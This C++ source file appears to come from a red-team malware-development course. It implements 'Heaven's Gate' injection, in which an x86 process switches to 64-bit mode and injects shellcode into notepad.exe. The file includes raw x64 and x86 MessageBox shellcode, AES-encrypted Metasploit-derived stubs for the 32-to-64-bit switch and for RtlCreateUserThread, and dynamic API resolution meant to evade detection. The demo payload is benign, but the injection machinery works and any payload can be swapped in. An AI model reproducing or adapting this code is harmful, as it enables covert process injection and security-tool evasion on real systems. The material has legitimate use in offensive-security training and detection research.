/*
- Compile as X86


*/

#include "pfndef.h"
#include "wow64.h"

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>

#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload64[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
};
SIZE_T payload64_len = sizeof(payload64);

// MessageBox shellcode - 32-bit
unsigned char payload32[] = {
  0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31,
  0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b,
  0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3,
  0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45,
  0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a,
  0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31,
  0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d,
  0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a,
  0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb,
  0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2,
  0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec,
  0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0xef, 0xce,
  0xe0, 0x60, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89,
  0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64,
  0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89,
  0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d,
  0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x44,
  0x65, 0x76, 0x58, 0x68, 0x20, 0x4d, 0x61, 0x6c, 0x68, 0x52, 0x54, 0x4f,
  0x3a, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x0b, 0x89, 0xe3, 0x68, 0x72, 0x21,
  0x58, 0x20, 0x68, 0x72, 0x61, 0x74, 0x6f, 0x68, 0x20, 0x4f, 0x70, 0x65,
  0x68, 0x54, 0x65, 0x61, 0x6d, 0x68, 0x52, 0x65, 0x64, 0x20, 0x68, 0x72,
  0x6f, 0x6d, 0x20, 0x68, 0x48, 0x69, 0x20, 0x66, 0x31, 0xc9, 0x88, 0x4c,
  0x24, 0x1a, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0,
  0x31, 0xc0, 0x50, 0xff, 0x55, 0x08
};
SIZE_T payload32_len = sizeof(payload32);

int AESDecrypt(char* payload, unsigned int payload_len, char* key, SIZE_T keylen) {

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))       { return -1; }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))                                { return -1; }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0))                                { return -1; }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))                              { return -1; }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len))  { return -1; }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{

    // ------------------------------------------------------------------------------------------------------------
    pfnCreateToolhelp32Snapshot pCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateToolhelp32Snapshot");
    if (pCreateToolhelp32Snapshot == NULL) {
        printf("[-] CreateToolhelp32Snapshot [KERNEL32] Failed      ->      [ %p ] [ %d ]\n", pCreateToolhelp32Snapshot, GetLastError());
        return -2;
    }
    printf("[*] CreateToolhelp32Snapshot [KERNEL32] Address         ->      [ %p ]\n", pCreateToolhelp32Snapshot);

    pfnProcess32FirstW pProcess32FirstW = (pfnProcess32FirstW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "Process32FirstW");
    if (pProcess32FirstW == NULL) {
        printf("[-] Process32First [KERNEL32] Failed                ->      [ %p ] [ %d ]\n", pProcess32FirstW, GetLastError());
        return -2;
    }
    printf("[*] Process32First [KERNEL32] Address                   ->      [ %p ]\n", pProcess32FirstW);

    pfnProcess32NextW pProcess32NextW = (pfnProcess32NextW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "Process32NextW");
    if (pProcess32NextW == NULL) {
        printf("[-] Process32Next [KERNEL32] Failed                 ->      [ %p ] [ %d ]\n", pProcess32NextW, GetLastError());
        return -2;
    }
    printf("[*] Process32Next [KERNEL32] Address                    ->      [ %p ]\n", pProcess32NextW);

    pfnCloseHandle pCloseHandle = (pfnCloseHandle)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CloseHandle");
    if (pCloseHandle == NULL) {
        printf("[-] CloseHandle [KERNEL32] Failed                   ->      [ %p ] [ %d ]\n", pCloseHandle, GetLastError());
        return -2;
    }
    printf("[*] CloseHandle [KERNEL32] Address                      ->      [ %p ]\n", pCloseHandle);
    // -------------------------------------------------------------------------------------------------------------
    printf(" ------------------------------------------------------------------------------------------------------------- \n");

    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Process Snapshot Failed         ->      [ %d ]\n", GetLastError());
        return 0;
    } //printf("Snapshot handle       ->        [ %p ]\n", processesSnapshot);

    pProcess32FirstW(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        pCloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    
    while (pProcess32NextW(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            pCloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }
    
    pCloseHandle(processesSnapshot);
    return pid;
}

int AccessHeaven(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

    //	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c

    LPVOID pRemoteCode = NULL;
    EXECUTEX64 pExecuteX64 = NULL;
    X64FUNCTION pX64function = NULL;
    WOW64CONTEXT* ctx = NULL;

    /*
     A simple function to execute native x64 code from a wow64 (x86) process.

     Can be called from C using the following prototype:
         typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
     The native x64 function you specify must be in the following form (as well as being x64 code):
         typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );

     Original binary:
         src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
        BYTE sh_executex64[] =  "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
                                "\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
                                "\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
                                "\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
                                "\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

        src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
        BYTE sh_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
                                "\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
                                "\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
                                "\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
                                "\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
                                "\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
                                "\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
                                "\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
                                "\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
                                "\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
                                "\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
                                "\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
                                "\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
                                "\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
                                "\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
                                "\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
                                "\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
                                "\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
                                "\x48\x83\xC4\x50\x48\x89\xFC\xC3";
    */

    // -------------------------------------------------------------------------------------------------------------


    //
    // Identify addresses of various functions we need
    //
    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
    if (pVirtualAllocEx == NULL) {
        printf("[-] VirtualAllocEx [KERNEL32] Failed            ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
        return -2;
    }
    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);

    pfnVirtualAlloc pVirtualAlloc = (pfnVirtualAlloc)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAlloc");
    if (pVirtualAlloc == NULL) {
        printf("[-] VirtualAlloc [KERNEL32] Failed              ->      [ %p ] [ %d ]\n", pVirtualAlloc, GetLastError());
        return -2;
    }
    printf("[*] VirtualAlloc [KERNEL32] Address         ->      [ %p ]\n", pVirtualAlloc);

    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
    if (pWriteProcessMemory == NULL) {
        printf("[-] WriteProcessMemory [KERNEL32] Failed        ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
        return -2;
    }
    printf("[*] WriteProcessMemory [KERNEL32] Address   ->      [ %p ]\n", pWriteProcessMemory);

    pfnVirtualProtectEx pVirtualProtectEx = (pfnVirtualProtectEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualProtectEx");
    if (pVirtualProtectEx == NULL) {
        printf("[-] VirtualProtectEx [KERNEL32] Failed          ->      [ %p ] [ %d ]\n", pVirtualProtectEx, GetLastError());
        return -2;
    }
    printf("[*] VirtualProtectEx [KERNEL32] Address     ->      [ %p ]\n", pVirtualProtectEx);

    pfnCreateRemoteThread pCreateRemoteThread = (pfnCreateRemoteThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateRemoteThread");
    if (pCreateRemoteThread == NULL) {
        printf("[-] CreateRemoteThread [KERNEL32] Failed        ->      [ %p ] [ %d ]\n", pCreateRemoteThread, GetLastError());
        return -2;
    }
    printf("[*] CreateRemoteThread [KERNEL32] Address   ->      [ %p ]\n", pCreateRemoteThread);

    pfnVirtualFree pVirtualFree = (pfnVirtualFree)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualFree");
    if (pVirtualFree == NULL) {
        printf("[-] VirtualAlloc [KERNEL32] Failed              ->      [ %p ] [ %d ]\n", pVirtualFree, GetLastError());
        return -2;
    }
    printf("[*] VirtualAlloc [KERNEL32] Address         ->      [ %p ]\n", pVirtualFree);

    pfnResumeThread pResumeThread = (pfnResumeThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "ResumeThread");
    if (pResumeThread == NULL) {
        printf("[-] ResumeThread [KERNEL32] Failed              ->      [ %p ] [ %d ]\n", pResumeThread, GetLastError());
        return -2;
    }
    printf("[*] ResumeThread [KERNEL32] Address         ->      [ %p ]\n", pResumeThread);

    // -------------------------------------------------------------------------------------------------------------
    printf(" ------------------------------------------------------------------------------------------------------------- \n");

    // AES-encrypted sh_executex64 function (switches to 64-bit mode and runs sh_wownativex)
    unsigned char sh_executex64[] = { 0xf7, 0x69, 0x26, 0xaf, 0x10, 0x56, 0x2a, 0xcc, 0xeb, 0x96, 0x6b, 0xd0, 0xb8, 0xe3, 0x4d, 0x44, 0x16, 0xb0, 0xf8, 0x9d, 0x32, 0xd9, 0x65, 0x12, 0xa2, 0x9e, 0xec, 0x5d, 0x37, 0xde, 0x34, 0x9a, 0x94, 0x19, 0xc7, 0xa5, 0xe6, 0xe8, 0x3e, 0xa2, 0x1d, 0x5a, 0x77, 0x25, 0xcb, 0xc, 0xcd, 0xd0, 0x59, 0x11, 0x3c, 0x2d, 0x4d, 0x16, 0xf1, 0x95, 0x3a, 0x33, 0x0, 0xb4, 0x3, 0x55, 0x98, 0x6f, 0x61, 0x84, 0x61, 0x2b, 0x8a, 0xe8, 0x53, 0x47, 0xaa, 0x58, 0xfc, 0x70, 0x91, 0xcd, 0xa9, 0xb1 };
    unsigned int sh_executex64_len = sizeof(sh_executex64);
    unsigned char sh_executex64_key[] = { 0x26, 0x96, 0xcc, 0x43, 0xca, 0x1f, 0xf8, 0xa, 0xe5, 0xcc, 0xbf, 0xf1, 0x2f, 0xc9, 0xae, 0x71 };
    SIZE_T sh_executex64_key_len = sizeof(sh_executex64_key);

    // AES-encrypted sh_wownativex function (calling RtlCreateUserThread in target process)
    unsigned char sh_wownativex[] = { 0x20, 0x8f, 0x32, 0x33, 0x59, 0xa1, 0xce, 0x2f, 0xf8, 0x8b, 0xa, 0xb4, 0x2a, 0x7f, 0xe6, 0x26, 0xe4, 0xd1, 0x4e, 0x25, 0x38, 0x57, 0xdd, 0xc4, 0x2c, 0x1c, 0x10, 0x2b, 0x70, 0x0, 0x9, 0x67, 0x5c, 0x70, 0x6d, 0x67, 0x4f, 0x27, 0xe8, 0xaf, 0xa1, 0x6f, 0x10, 0x42, 0x73, 0x9d, 0x4a, 0xb1, 0x6, 0x22, 0x89, 0xef, 0xac, 0x40, 0xd7, 0x93, 0x94, 0x6e, 0x4c, 0x6e, 0xf4, 0xcb, 0x46, 0x4d, 0xf3, 0xe8, 0xb5, 0x36, 0x11, 0xa6, 0xad, 0xeb, 0x8d, 0xda, 0xa0, 0x54, 0x75, 0xd9, 0xf3, 0x41, 0x34, 0xb3, 0xa6, 0x70, 0x41, 0x3e, 0xf3, 0x96, 0x97, 0x12, 0x74, 0x6b, 0x2e, 0x36, 0x31, 0x26, 0x86, 0x2, 0x24, 0x59, 0x40, 0xb9, 0xbb, 0x2b, 0xa2, 0x98, 0xbe, 0x15, 0x73, 0xb5, 0x90, 0x39, 0xe5, 0x82, 0xbb, 0xdd, 0x7, 0xe9, 0x9d, 0x89, 0x9a, 0x9e, 0x5f, 0x94, 0xde, 0x2, 0x80, 0x36, 0x45, 0x5d, 0x8e, 0xe6, 0x5e, 0x2c, 0x58, 0x59, 0xf4, 0xf7, 0xa0, 0xbf, 0x7e, 0x94, 0xff, 0x50, 0xf0, 0x76, 0x74, 0x2f, 0xd1, 0x91, 0x18, 0x65, 0x12, 0x30, 0xfa, 0x4, 0x61, 0xa5, 0x4d, 0x25, 0x57, 0xf4, 0x52, 0x99, 0xa2, 0x93, 0x67, 0xe1, 0x6, 0x43, 0x4b, 0x55, 0x53, 0x67, 0x89, 0x18, 0x71, 0x72, 0xdb, 0x82, 0xef, 0x5b, 0xdc, 0x8b, 0xb0, 0x91, 0xf5, 0x58, 0xe4, 0x85, 0xc3, 0x80, 0x7b, 0x79, 0x21, 0x3a, 0x60, 0x99, 0xc5, 0x62, 0x2c, 0x73, 0xa4, 0x2b, 0xe2, 0xc, 0xda, 0xa2, 0x88, 0x6b, 0x2f, 0x38, 0x80, 0xfd, 0xb1, 0xaf, 0xea, 0x4f, 0xb5, 0x0, 0xda, 0x46, 0x46, 0x9d, 0x23, 0xdd, 0xe3, 0x4a, 0xf5, 0xc9, 0x8, 0xf0, 0x97, 0xa9, 0x55, 0x71, 0xda, 0x84, 0xa9, 0xf5, 0xcb, 0x1f, 0xb9, 0xb9, 0x67, 0xf7, 0xf2, 0x2f, 0x2a, 0x56, 0x3, 0xe1, 0x56, 0x26, 0xb4, 0x3a, 0xd9, 0xe2, 0x11, 0x8a, 0x8f, 0xef, 0x8c, 0x89, 0xc0, 0x26, 0x9c, 0x9f, 0xe5, 0x18, 0xd4, 0xd7, 0xae, 0x91, 0xbf, 0x2b, 0x14, 0xbb, 0xfd, 0xe0, 0xb5, 0x9c, 0x9d, 0x81, 0x71, 0x5d, 0xdd, 0xe6, 0x5d, 0x8a, 0xe6, 0x61, 0xf2, 0x69, 0xf8, 0x95, 0x4f, 0xcd, 0xe3, 0x52, 0x1f, 0x14, 0xe5, 0x8c };
    unsigned int sh_wownativex_len = sizeof(sh_wownativex);
    unsigned char sh_wownativex_key[] = { 0xe5, 0x53, 0xc4, 0x11, 0x75, 0x14, 0x86, 0x8f, 0x59, 0x35, 0x7c, 0xc7, 0x8b, 0xc5, 0xdc, 0x2d };
    SIZE_T sh_wownativex_key_len = sizeof(sh_wownativex_key);

    // Inject payload into target process
    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (!pRemoteCode) {
        return -1;
    }
    else {
        Sleep(1000);
        //printf("[*] Remote process allocated memory address          -> [ %p ]\n", pRemoteCode); 
        //getchar();
    }
    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);


    // Allocate a RW buffer in this process for the EXECUTEX64 function
    pExecuteX64 = (EXECUTEX64)pVirtualAlloc(NULL, sizeof(sh_executex64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    // Allocate a RW buffer in this process for the X64FUNCTION function (and its context)
    pX64function = (X64FUNCTION)pVirtualAlloc(NULL, sizeof(sh_wownativex) + sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    printf("[*] EXECUTEX64                      ->      [ %p ]\n", pExecuteX64);
    printf("[*] WOWNATIVE (X64FUNCTION)         ->      [ %p ]\n", pX64function); 
    //getchar();

    // decrypt and copy over the wow64->x64 stub
    AESDecrypt((char*)sh_executex64, sh_executex64_len, (char*)sh_executex64_key, sh_executex64_key_len);
    memcpy(pExecuteX64, sh_executex64, sh_executex64_len);
    pVirtualAlloc(pExecuteX64, sizeof(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ);

    // decrypt and copy over the native x64 function
    AESDecrypt((char*)sh_wownativex, sh_wownativex_len, (char*)sh_wownativex_key, sh_wownativex_key_len);
    memcpy(pX64function, sh_wownativex, sh_wownativex_len);

    // pX64function shellcode modifies itself during the runtime, so memory has to be RWX
    pVirtualAlloc(pX64function, sizeof(sh_wownativex) + sizeof(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // set the context
    ctx = (WOW64CONTEXT*)((BYTE*)pX64function + sh_wownativex_len);

    ctx->h.hProcess = hProc;
    ctx->s.lpStartAddress = pRemoteCode;
    ctx->p.lpParameter = 0;
    ctx->t.hThread = NULL;

    //printf("Context Set !\nhit me...\n"); getchar();

    // run a new thread in target process
    pExecuteX64(pX64function, (DWORD)ctx);

    if (ctx->t.hThread) {
        // if success, resume the thread -> execute payload
        //printf("Thread should be there, frozen...\n"); 
        //getchar();

        pResumeThread(ctx->t.hThread);

        // cleanup in target process
        pVirtualFree(pExecuteX64, 0, MEM_RELEASE);
        pVirtualFree(pX64function, 0, MEM_RELEASE);

        return 0;
    }
    else
        return 1;
}

int main()
{
    pfnOpenProcess pOpenProcess = (pfnOpenProcess)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "OpenProcess");
    if (pOpenProcess == NULL) {
        printf("[-] OpenProcess [KERNEL32] Failed                   ->      [ %p ] [ %d ]\n", pOpenProcess, GetLastError());
        return -2;
    }
    printf("[*] OpenProcess [KERNEL32] Address                      ->      [ %p ]\n", pOpenProcess);

    // change process
    auto procPid = FindProcessId(L"notepad.exe");

    if (!procPid) {
        printf("[-] No Process Found !\n");
        return 0;
    } 
    else 
    {
        printf("[*] Process ID                              ->      [ %d ]\n", procPid);
    }

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, false, procPid);

    if (!hProcess) {
        return 0;
    }
    else {
        AccessHeaven(hProcess, payload64, payload64_len);
        CloseHandle(hProcess);
    }

}